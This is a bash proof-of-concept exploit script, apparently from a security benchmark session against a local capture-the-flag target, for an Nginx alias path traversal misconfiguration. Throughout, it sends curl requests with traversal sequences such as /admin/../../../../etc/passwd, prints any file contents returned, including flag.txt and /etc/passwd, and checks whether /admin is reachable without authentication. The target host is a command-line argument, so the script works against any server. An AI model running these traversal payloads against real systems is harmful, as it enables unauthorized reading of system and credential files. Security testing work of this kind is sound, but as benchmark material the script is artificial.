#!/bin/bash
# POC: Demonstrates Nginx alias path traversal vulnerability. Tests access to files outside the intended directory using path traversal sequences like /../ through the /admin endpoint with misconfigured alias directive.
# Target: ./repo
# Created: 2025-11-07T18:27:28.493Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# Nginx Alias Path Traversal POC
# This script demonstrates the vulnerability in the /admin location with alias misconfiguration

TARGET_HOST="${1:-localhost:8080}"
TARGET_URL="http://$TARGET_HOST"

echo "========================================="
echo "Nginx Alias Path Traversal POC"
echo "========================================="
echo "Target: $TARGET_URL"
echo ""

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test 1: Access /admin/ and check for directory listing
echo "[*] Test 1: Attempting to access /admin/ (directory listing test)..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/admin/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] /admin/ accessible (HTTP 200)${NC}"
    if echo "$BODY" | grep -qi "index of\|<title>.*[Ii]ndex"; then
        echo -e "${GREEN}[+] Directory listing detected (autoindex enabled)${NC}"
    fi
    if echo "$BODY" | grep -qi "flag.txt"; then
        echo -e "${GREEN}[+] flag.txt found in directory listing!${NC}"
    fi
else
    echo -e "${RED}[-] /admin/ returned HTTP $HTTP_CODE${NC}"
fi
echo ""

# Test 2: Attempt path traversal via /admin/../../flag.txt
echo "[*] Test 2: Attempting path traversal - /admin/../../flag.txt..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/admin/../../flag.txt")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] flag.txt accessible via path traversal! (HTTP 200)${NC}"
    echo -e "${GREEN}[+] File contents:${NC}"
    echo "$BODY"
else
    echo -e "${YELLOW}[-] flag.txt not accessible via /admin/../../flag.txt (HTTP $HTTP_CODE)${NC}"
fi
echo ""

# Test 3: Attempt path traversal via /admin/../
echo "[*] Test 3: Attempting path traversal - /admin/../index.php..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/admin/../index.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] Parent directory file accessible (HTTP 200)${NC}"
    echo -e "${GREEN}[+] Successfully bypassed /admin/ restriction${NC}"
else
    echo -e "${YELLOW}[-] Parent file not accessible (HTTP $HTTP_CODE)${NC}"
fi
echo ""

# Test 4: Attempt to access etc/passwd through path traversal
echo "[*] Test 4: Attempting to access /etc/passwd via /admin/../../../../etc/passwd..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/admin/../../../../etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] /etc/passwd accessible! (HTTP 200)${NC}"
    echo -e "${GREEN}[+] Critical vulnerability confirmed!${NC}"
    echo "$BODY" | head -n 5
    echo "..."
else
    echo -e "${YELLOW}[-] /etc/passwd not accessible (HTTP $HTTP_CODE)${NC}"
fi
echo ""

# Test 5: Check for authentication
echo "[*] Test 5: Checking if /admin/ requires authentication..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/admin/index.php")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}[+] /admin/index.php accessible without authentication (HTTP 200)${NC}"
    echo -e "${GREEN}[+] Authentication bypass confirmed!${NC}"
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo -e "${YELLOW}[!] /admin/index.php returned HTTP $HTTP_CODE (requires authentication)${NC}"
else
    echo -e "${YELLOW}[-] /admin/index.php returned HTTP $HTTP_CODE${NC}"
fi
echo ""

echo "========================================="
echo "POC Execution Complete"
echo "========================================="